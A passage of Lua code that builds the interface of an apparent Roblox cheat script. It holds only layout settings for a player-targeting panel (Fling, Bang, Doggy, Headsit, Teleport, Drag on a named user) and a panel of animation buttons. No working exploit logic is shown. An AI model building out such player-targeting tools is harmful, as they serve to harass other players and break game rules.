Fly_Button.Parent = Character_Section
Fly_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Fly_Button.BackgroundTransparency = 0.500
Fly_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.BorderSizePixel = 0
Fly_Button.Position = UDim2.new(0, 25, 0, 175)
Fly_Button.Size = UDim2.new(0, 150, 0, 30)
Fly_Button.Font = Enum.Font.Oswald
Fly_Button.Text = "Fly"
Fly_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.TextScaled = true
Fly_Button.TextSize = 14.000
Fly_Button.TextWrapped = true

Target_Section.Name = "Target_Section"
Target_Section.Parent = Background
Target_Section.Active = true
Target_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Target_Section.BackgroundTransparency = 1.000
Target_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section.BorderSizePixel = 0
Target_Section.Position = UDim2.new(0, 105, 0, 30)
Target_Section.Size = UDim2.new(0, 395, 0, 320)
Target_Section.Visible = false
Target_Section.CanvasSize = UDim2.new(0, 0, 1.25, 0)
Target_Section.ScrollBarThickness = 5

TargetImage.Name = "TargetImage"
TargetImage.Parent = Target_Section
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetImage.Position = UDim2.new(0, 25, 0, 25)
TargetImage.Size = UDim2.new(0, 100, 0, 100)
TargetImage.Image = "rbxassetid://10818605405"

TargetName_Input.Name = "TargetName_Input"
TargetName_Input.Parent = Target_Section
TargetName_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
TargetName_Input.BackgroundTransparency = 0.300
TargetName_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetName_Input.Position = UDim2.new(0, 150, 0, 30)
TargetName_Input.Size = UDim2.new(0, 175, 0, 30)
TargetName_Input.Font = Enum.Font.Gotham
TargetName_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TargetName_Input.PlaceholderText = "@target..."
TargetName_Input.Text = ""
TargetName_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
TargetName_Input.TextSize = 14.000
TargetName_Input.TextWrapped = true

ClickTargetTool_Button.Name = "ClickTargetTool_Button"
ClickTargetTool_Button.Parent = TargetName_Input
ClickTargetTool_Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClickTargetTool_Button.BackgroundTransparency = 1.000
ClickTargetTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClickTargetTool_Button.BorderSizePixel = 0
ClickTargetTool_Button.Position = UDim2.new(0, 180, 0, 0)
ClickTargetTool_Button.Size = UDim2.new(0, 30, 0, 30)
ClickTargetTool_Button.Image = "rbxassetid://2716591855"

UserIDTargetLabel.Name = "UserIDTargetLabel"
UserIDTargetLabel.Parent = Target_Section
UserIDTargetLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UserIDTargetLabel.BackgroundTransparency = 1.000
UserIDTargetLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
UserIDTargetLabel.BorderSizePixel = 0
UserIDTargetLabel.Position = UDim2.new(0, 150, 0, 70)
UserIDTargetLabel.Size = UDim2.new(0, 300, 0, 75)
UserIDTargetLabel.Font = Enum.Font.Oswald
UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
UserIDTargetLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
UserIDTargetLabel.TextSize = 18.000
UserIDTargetLabel.TextWrapped = true
UserIDTargetLabel.TextXAlignment = Enum.TextXAlignment.Left
UserIDTargetLabel.TextYAlignment = Enum.TextYAlignment.Top

ViewTarget_Button.Name = "ViewTarget_Button"
ViewTarget_Button.Parent = Target_Section
ViewTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ViewTarget_Button.BackgroundTransparency = 0.500
ViewTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.BorderSizePixel = 0
ViewTarget_Button.Position = UDim2.new(0, 210, 0, 150)
ViewTarget_Button.Size = UDim2.new(0, 150, 0, 30)
ViewTarget_Button.Font = Enum.Font.Oswald
ViewTarget_Button.Text = "View"
ViewTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ViewTarget_Button.TextScaled = true
ViewTarget_Button.TextSize = 14.000
ViewTarget_Button.TextWrapped = true

FlingTarget_Button.Name = "FlingTarget_Button"
FlingTarget_Button.Parent = Target_Section
FlingTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlingTarget_Button.BackgroundTransparency = 0.500
FlingTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.BorderSizePixel = 0
FlingTarget_Button.Position = UDim2.new(0, 25, 0, 150)
FlingTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FlingTarget_Button.Font = Enum.Font.Oswald
FlingTarget_Button.Text = "Fling"
FlingTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlingTarget_Button.TextScaled = true
FlingTarget_Button.TextSize = 14.000
FlingTarget_Button.TextWrapped = true

FocusTarget_Button.Name = "FocusTarget_Button"
FocusTarget_Button.Parent = Target_Section
FocusTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FocusTarget_Button.BackgroundTransparency = 0.500
FocusTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.BorderSizePixel = 0
FocusTarget_Button.Position = UDim2.new(0, 25, 0, 200)
FocusTarget_Button.Size = UDim2.new(0, 150, 0, 30)
FocusTarget_Button.Font = Enum.Font.Oswald
FocusTarget_Button.Text = "Focus"
FocusTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FocusTarget_Button.TextScaled = true
FocusTarget_Button.TextSize = 14.000
FocusTarget_Button.TextWrapped = true

BenxTarget_Button.Name = "BenxTarget_Button"
BenxTarget_Button.Parent = Target_Section
BenxTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BenxTarget_Button.BackgroundTransparency = 0.500
BenxTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.BorderSizePixel = 0
BenxTarget_Button.Position = UDim2.new(0, 210, 0, 200)
BenxTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BenxTarget_Button.Font = Enum.Font.Oswald
BenxTarget_Button.Text = "Bang"
BenxTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BenxTarget_Button.TextScaled = true
BenxTarget_Button.TextSize = 14.000
BenxTarget_Button.TextWrapped = true

PushTarget_Button.Name = "PushTarget_Button"
PushTarget_Button.Parent = Target_Section
PushTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushTarget_Button.BackgroundTransparency = 0.500
PushTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.BorderSizePixel = 0
PushTarget_Button.Position = UDim2.new(0, 25, 0, 400)
PushTarget_Button.Size = UDim2.new(0, 150, 0, 30)
PushTarget_Button.Font = Enum.Font.Oswald
PushTarget_Button.Text = "Push"
PushTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushTarget_Button.TextScaled = true
PushTarget_Button.TextSize = 14.000
PushTarget_Button.TextWrapped = true

WhitelistTarget_Button.Name = "WhitelistTarget_Button"
WhitelistTarget_Button.Parent = Target_Section
WhitelistTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WhitelistTarget_Button.BackgroundTransparency = 0.500
WhitelistTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.BorderSizePixel = 0
WhitelistTarget_Button.Position = UDim2.new(0, 210, 0, 400)
WhitelistTarget_Button.Size = UDim2.new(0, 150, 0, 30)
WhitelistTarget_Button.Font = Enum.Font.Oswald
WhitelistTarget_Button.Text = "Whitelist"
WhitelistTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WhitelistTarget_Button.TextScaled = true
WhitelistTarget_Button.TextSize = 14.000
WhitelistTarget_Button.TextWrapped = true

TeleportTarget_Button.Name = "TeleportTarget_Button"
TeleportTarget_Button.Parent = Target_Section
TeleportTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TeleportTarget_Button.BackgroundTransparency = 0.500
TeleportTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.BorderSizePixel = 0
TeleportTarget_Button.Position = UDim2.new(0, 210, 0, 350)
TeleportTarget_Button.Size = UDim2.new(0, 150, 0, 30)
TeleportTarget_Button.Font = Enum.Font.Oswald
TeleportTarget_Button.Text = "Teleport"
TeleportTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TeleportTarget_Button.TextScaled = true
TeleportTarget_Button.TextSize = 14.000
TeleportTarget_Button.TextWrapped = true

HeadsitTarget_Button.Name = "HeadsitTarget_Button"
HeadsitTarget_Button.Parent = Target_Section
HeadsitTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeadsitTarget_Button.BackgroundTransparency = 0.500
HeadsitTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.BorderSizePixel = 0
HeadsitTarget_Button.Position = UDim2.new(0, 210, 0, 250)
HeadsitTarget_Button.Size = UDim2.new(0, 150, 0, 30)
HeadsitTarget_Button.Font = Enum.Font.Oswald
HeadsitTarget_Button.Text = "Headsit"
HeadsitTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeadsitTarget_Button.TextScaled = true
HeadsitTarget_Button.TextSize = 14.000
HeadsitTarget_Button.TextWrapped = true

StandTarget_Button.Name = "StandTarget_Button"
StandTarget_Button.Parent = Target_Section
StandTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
StandTarget_Button.BackgroundTransparency = 0.500
StandTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.BorderSizePixel = 0
StandTarget_Button.Position = UDim2.new(0, 25, 0, 250)
StandTarget_Button.Size = UDim2.new(0, 150, 0, 30)
StandTarget_Button.Font = Enum.Font.Oswald
StandTarget_Button.Text = "Stand"
StandTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
StandTarget_Button.TextScaled = true
StandTarget_Button.TextSize = 14.000
StandTarget_Button.TextWrapped = true

BackpackTarget_Button.Name = "BackpackTarget_Button"
BackpackTarget_Button.Parent = Target_Section
BackpackTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BackpackTarget_Button.BackgroundTransparency = 0.500
BackpackTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.BorderSizePixel = 0
BackpackTarget_Button.Position = UDim2.new(0, 210, 0, 300)
BackpackTarget_Button.Size = UDim2.new(0, 150, 0, 30)
BackpackTarget_Button.Font = Enum.Font.Oswald
BackpackTarget_Button.Text = "Backpack"
BackpackTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BackpackTarget_Button.TextScaled = true
BackpackTarget_Button.TextSize = 14.000
BackpackTarget_Button.TextWrapped = true

DoggyTarget_Button.Name = "DoggyTarget_Button"
DoggyTarget_Button.Parent = Target_Section
DoggyTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DoggyTarget_Button.BackgroundTransparency = 0.500
DoggyTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.BorderSizePixel = 0
DoggyTarget_Button.Position = UDim2.new(0, 25, 0, 300)
DoggyTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DoggyTarget_Button.Font = Enum.Font.Oswald
DoggyTarget_Button.Text = "Doggy"
DoggyTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DoggyTarget_Button.TextScaled = true
DoggyTarget_Button.TextSize = 14.000
DoggyTarget_Button.TextWrapped = true

DragTarget_Button.Name = "DragTarget_Button"
DragTarget_Button.Parent = Target_Section
DragTarget_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
DragTarget_Button.BackgroundTransparency = 0.500
DragTarget_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.BorderSizePixel = 0
DragTarget_Button.Position = UDim2.new(0, 25, 0, 350)
DragTarget_Button.Size = UDim2.new(0, 150, 0, 30)
DragTarget_Button.Font = Enum.Font.Oswald
DragTarget_Button.Text = "Drag"
DragTarget_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
DragTarget_Button.TextScaled = true
DragTarget_Button.TextSize = 14.000
DragTarget_Button.TextWrapped = true

Animations_Section.Name = "Animations_Section"
Animations_Section.Parent = Background
Animations_Section.Active = true
Animations_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Animations_Section.BackgroundTransparency = 1.000
Animations_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section.BorderSizePixel = 0
Animations_Section.Position = UDim2.new(0, 105, 0, 30)
Animations_Section.Size = UDim2.new(0, 395, 0, 320)
Animations_Section.Visible = false
Animations_Section.CanvasSize = UDim2.new(0, 0, 1.6, 0)
Animations_Section.ScrollBarThickness = 5

VampireAnim_Button.Name = "VampireAnim_Button"
VampireAnim_Button.Parent = Animations_Section
VampireAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VampireAnim_Button.BackgroundTransparency = 0.500
VampireAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.BorderSizePixel = 0
VampireAnim_Button.Position = UDim2.new(0, 25, 0, 25)
VampireAnim_Button.Size = UDim2.new(0, 150, 0, 30)
VampireAnim_Button.Font = Enum.Font.Oswald
VampireAnim_Button.Text = "Vampire"
VampireAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VampireAnim_Button.TextScaled = true
VampireAnim_Button.TextSize = 14.000
VampireAnim_Button.TextWrapped = true

HeroAnim_Button.Name = "HeroAnim_Button"
HeroAnim_Button.Parent = Animations_Section
HeroAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HeroAnim_Button.BackgroundTransparency = 0.500
HeroAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.BorderSizePixel = 0
HeroAnim_Button.Position = UDim2.new(0, 210, 0, 25)
HeroAnim_Button.Size = UDim2.new(0, 150, 0, 30)
HeroAnim_Button.Font = Enum.Font.Oswald
HeroAnim_Button.Text = "Hero"
HeroAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
HeroAnim_Button.TextScaled = true
HeroAnim_Button.TextSize = 14.000
HeroAnim_Button.TextWrapped = true

ZombieClassicAnim_Button.Name = "ZombieClassicAnim_Button"
ZombieClassicAnim_Button.Parent = Animations_Section
ZombieClassicAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieClassicAnim_Button.BackgroundTransparency = 0.500
ZombieClassicAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.BorderSizePixel = 0
ZombieClassicAnim_Button.Position = UDim2.new(0, 25, 0, 75)
ZombieClassicAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieClassicAnim_Button.Font = Enum.Font.Oswald
ZombieClassicAnim_Button.Text = "Zombie Classic"
ZombieClassicAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieClassicAnim_Button.TextScaled = true
ZombieClassicAnim_Button.TextSize = 14.000
ZombieClassicAnim_Button.TextWrapped = true

MageAnim_Button.Name = "MageAnim_Button"
MageAnim_Button.Parent = Animations_Section
MageAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MageAnim_Button.BackgroundTransparency = 0.500
MageAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.BorderSizePixel = 0
MageAnim_Button.Position = UDim2.new(0, 210, 0, 75)
MageAnim_Button.Size = UDim2.new(0, 150, 0, 30)
MageAnim_Button.Font = Enum.Font.Oswald
MageAnim_Button.Text = "Mage"
MageAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MageAnim_Button.TextScaled = true
MageAnim_Button.TextSize = 14.000
MageAnim_Button.TextWrapped = true

GhostAnim_Button.Name = "GhostAnim_Button"
GhostAnim_Button.Parent = Animations_Section
GhostAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
GhostAnim_Button.BackgroundTransparency = 0.500
GhostAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.BorderSizePixel = 0
GhostAnim_Button.Position = UDim2.new(0, 25, 0, 125)
GhostAnim_Button.Size = UDim2.new(0, 150, 0, 30)
GhostAnim_Button.Font = Enum.Font.Oswald
GhostAnim_Button.Text = "Ghost"
GhostAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
GhostAnim_Button.TextScaled = true
GhostAnim_Button.TextSize = 14.000
GhostAnim_Button.TextWrapped = true

ElderAnim_Button.Name = "ElderAnim_Button"
ElderAnim_Button.Parent = Animations_Section
ElderAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ElderAnim_Button.BackgroundTransparency = 0.500
ElderAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.BorderSizePixel = 0
ElderAnim_Button.Position = UDim2.new(0, 210, 0, 125)
ElderAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ElderAnim_Button.Font = Enum.Font.Oswald
ElderAnim_Button.Text = "Elder"
ElderAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ElderAnim_Button.TextScaled = true
ElderAnim_Button.TextSize = 14.000
ElderAnim_Button.TextWrapped = true

LevitationAnim_Button.Name = "LevitationAnim_Button"
LevitationAnim_Button.Parent = Animations_Section
LevitationAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LevitationAnim_Button.BackgroundTransparency = 0.500
LevitationAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.BorderSizePixel = 0
LevitationAnim_Button.Position = UDim2.new(0, 25, 0, 175)
LevitationAnim_Button.Size = UDim2.new(0, 150, 0, 30)
LevitationAnim_Button.Font = Enum.Font.Oswald
LevitationAnim_Button.Text = "Levitation"
LevitationAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LevitationAnim_Button.TextScaled = true
LevitationAnim_Button.TextSize = 14.000
LevitationAnim_Button.TextWrapped = true

AstronautAnim_Button.Name = "AstronautAnim_Button"
AstronautAnim_Button.Parent = Animations_Section
AstronautAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AstronautAnim_Button.BackgroundTransparency = 0.500
AstronautAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.BorderSizePixel = 0
AstronautAnim_Button.Position = UDim2.new(0, 210, 0, 175)
AstronautAnim_Button.Size = UDim2.new(0, 150, 0, 30)
AstronautAnim_Button.Font = Enum.Font.Oswald
AstronautAnim_Button.Text = "Astronaut"
AstronautAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AstronautAnim_Button.TextScaled = true
AstronautAnim_Button.TextSize = 14.000
AstronautAnim_Button.TextWrapped = true

NinjaAnim_Button.Name = "NinjaAnim_Button"
NinjaAnim_Button.Parent = Animations_Section
NinjaAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NinjaAnim_Button.BackgroundTransparency = 0.500
NinjaAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.BorderSizePixel = 0
NinjaAnim_Button.Position = UDim2.new(0, 25, 0, 225)
NinjaAnim_Button.Size = UDim2.new(0, 150, 0, 30)
NinjaAnim_Button.Font = Enum.Font.Oswald
NinjaAnim_Button.Text = "Ninja"
NinjaAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NinjaAnim_Button.TextScaled = true
NinjaAnim_Button.TextSize = 14.000
NinjaAnim_Button.TextWrapped = true

WerewolfAnim_Button.Name = "WerewolfAnim_Button"
WerewolfAnim_Button.Parent = Animations_Section
WerewolfAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WerewolfAnim_Button.BackgroundTransparency = 0.500
WerewolfAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.BorderSizePixel = 0
WerewolfAnim_Button.Position = UDim2.new(0, 210, 0, 225)
WerewolfAnim_Button.Size = UDim2.new(0, 150, 0, 30)
WerewolfAnim_Button.Font = Enum.Font.Oswald
WerewolfAnim_Button.Text = "Werewolf"
WerewolfAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WerewolfAnim_Button.TextScaled = true
WerewolfAnim_Button.TextSize = 14.000
WerewolfAnim_Button.TextWrapped = true

CartoonAnim_Button.Name = "CartoonAnim_Button"
CartoonAnim_Button.Parent = Animations_Section
CartoonAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CartoonAnim_Button.BackgroundTransparency = 0.500
CartoonAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.BorderSizePixel = 0
CartoonAnim_Button.Position = UDim2.new(0, 25, 0, 275)
CartoonAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CartoonAnim_Button.Font = Enum.Font.Oswald
CartoonAnim_Button.Text = "Cartoon"
CartoonAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CartoonAnim_Button.TextScaled = true
CartoonAnim_Button.TextSize = 14.000
CartoonAnim_Button.TextWrapped = true

PirateAnim_Button.Name = "PirateAnim_Button"
PirateAnim_Button.Parent = Animations_Section
PirateAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PirateAnim_Button.BackgroundTransparency = 0.500
PirateAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.BorderSizePixel = 0
PirateAnim_Button.Position = UDim2.new(0, 210, 0, 275)
PirateAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PirateAnim_Button.Font = Enum.Font.Oswald
PirateAnim_Button.Text = "Pirate"
PirateAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PirateAnim_Button.TextScaled = true
PirateAnim_Button.TextSize = 14.000
PirateAnim_Button.TextWrapped = true

SneakyAnim_Button.Name = "SneakyAnim_Button"
SneakyAnim_Button.Parent = Animations_Section
SneakyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SneakyAnim_Button.BackgroundTransparency = 0.500
SneakyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.BorderSizePixel = 0
SneakyAnim_Button.Position = UDim2.new(0, 25, 0, 325)
SneakyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
SneakyAnim_Button.Font = Enum.Font.Oswald
SneakyAnim_Button.Text = "Sneaky"
SneakyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SneakyAnim_Button.TextScaled = true
SneakyAnim_Button.TextSize = 14.000
SneakyAnim_Button.TextWrapped = true

ToyAnim_Button.Name = "ToyAnim_Button"
ToyAnim_Button.Parent = Animations_Section
ToyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ToyAnim_Button.BackgroundTransparency = 0.500
ToyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.BorderSizePixel = 0
ToyAnim_Button.Position = UDim2.new(0, 210, 0, 325)
ToyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ToyAnim_Button.Font = Enum.Font.Oswald
ToyAnim_Button.Text = "Toy"
ToyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ToyAnim_Button.TextScaled = true
ToyAnim_Button.TextSize = 14.000
ToyAnim_Button.TextWrapped = true

KnightAnim_Button.Name = "KnightAnim_Button"
KnightAnim_Button.Parent = Animations_Section
KnightAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
KnightAnim_Button.BackgroundTransparency = 0.500
KnightAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.BorderSizePixel = 0
KnightAnim_Button.Position = UDim2.new(0, 25, 0, 375)
KnightAnim_Button.Size = UDim2.new(0, 150, 0, 30)
KnightAnim_Button.Font = Enum.Font.Oswald
KnightAnim_Button.Text = "Knight"
KnightAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
KnightAnim_Button.TextScaled = true
KnightAnim_Button.TextSize = 14.000
KnightAnim_Button.TextWrapped = true

ConfidentAnim_Button.Name = "ConfidentAnim_Button"
ConfidentAnim_Button.Parent = Animations_Section
ConfidentAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ConfidentAnim_Button.BackgroundTransparency = 0.500
ConfidentAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.BorderSizePixel = 0
ConfidentAnim_Button.Position = UDim2.new(0, 210, 0, 375)
ConfidentAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ConfidentAnim_Button.Font = Enum.Font.Oswald
ConfidentAnim_Button.Text = "Confident"
ConfidentAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ConfidentAnim_Button.TextScaled = true
ConfidentAnim_Button.TextSize = 14.000
ConfidentAnim_Button.TextWrapped = true

PopstarAnim_Button.Name = "PopstarAnim_Button"
PopstarAnim_Button.Parent = Animations_Section
PopstarAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PopstarAnim_Button.BackgroundTransparency = 0.500
PopstarAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.BorderSizePixel = 0
PopstarAnim_Button.Position = UDim2.new(0, 25, 0, 425)
PopstarAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PopstarAnim_Button.Font = Enum.Font.Oswald
PopstarAnim_Button.Text = "Popstar"
PopstarAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PopstarAnim_Button.TextScaled = true
PopstarAnim_Button.TextSize = 14.000
PopstarAnim_Button.TextWrapped = true

PrincessAnim_Button.Name = "PrincessAnim_Button"
PrincessAnim_Button.Parent = Animations_Section
PrincessAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PrincessAnim_Button.BackgroundTransparency = 0.500
PrincessAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.BorderSizePixel = 0
PrincessAnim_Button.Position = UDim2.new(0, 210, 0, 425)
PrincessAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PrincessAnim_Button.Font = Enum.Font.Oswald
PrincessAnim_Button.Text = "Princess"
PrincessAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PrincessAnim_Button.TextScaled = true
PrincessAnim_Button.TextSize = 14.000
PrincessAnim_Button.TextWrapped = true

CowboyAnim_Button.Name = "CowboyAnim_Button"
CowboyAnim_Button.Parent = Animations_Section
CowboyAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CowboyAnim_Button.BackgroundTransparency = 0.500
CowboyAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.BorderSizePixel = 0
CowboyAnim_Button.Position = UDim2.new(0, 25, 0, 475)
CowboyAnim_Button.Size = UDim2.new(0, 150, 0, 30)
CowboyAnim_Button.Font = Enum.Font.Oswald
CowboyAnim_Button.Text = "Cowboy"
CowboyAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CowboyAnim_Button.TextScaled = true
CowboyAnim_Button.TextSize = 14.000
CowboyAnim_Button.TextWrapped = true

PatrolAnim_Button.Name = "PatrolAnim_Button"
PatrolAnim_Button.Parent = Animations_Section
PatrolAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PatrolAnim_Button.BackgroundTransparency = 0.500
PatrolAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.BorderSizePixel = 0
PatrolAnim_Button.Position = UDim2.new(0, 210, 0, 475)
PatrolAnim_Button.Size = UDim2.new(0, 150, 0, 30)
PatrolAnim_Button.Font = Enum.Font.Oswald
PatrolAnim_Button.Text = "Patrol"
PatrolAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PatrolAnim_Button.TextScaled = true
PatrolAnim_Button.TextSize = 14.000
PatrolAnim_Button.TextWrapped = true

ZombieFEAnim_Button.Name = "ZombieFEAnim_Button"
ZombieFEAnim_Button.Parent = Animations_Section
ZombieFEAnim_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ZombieFEAnim_Button.BackgroundTransparency = 0.500
ZombieFEAnim_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.BorderSizePixel = 0
ZombieFEAnim_Button.Position = UDim2.new(0, 25, 0, 525)
ZombieFEAnim_Button.Size = UDim2.new(0, 150, 0, 30)
ZombieFEAnim_Button.Font = Enum.Font.Oswald
ZombieFEAnim_Button.Text = "FE Zombie"
ZombieFEAnim_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ZombieFEAnim_Button.TextScaled = true
ZombieFEAnim_Button.TextSize = 14.000
ZombieFEAnim_Button.TextWrapped = true

Misc_Section.Name = "Misc_Section"
Misc_Section.Parent = Background
Misc_Section.Active = true
Misc_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Misc_Section.BackgroundTransparency = 1.000
Misc_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section.BorderSizePixel = 0
Misc_Section.Position = UDim2.new(0, 105, 0, 30)
Misc_Section.Size = UDim2.new(0, 395, 0, 320)
Misc_Section.Visible = false
Misc_Section.CanvasSize = UDim2.new(0, 0, 1.1, 0)
Misc_Section.ScrollBarThickness = 5

AntiFling_Button.Name = "AntiFling_Button"
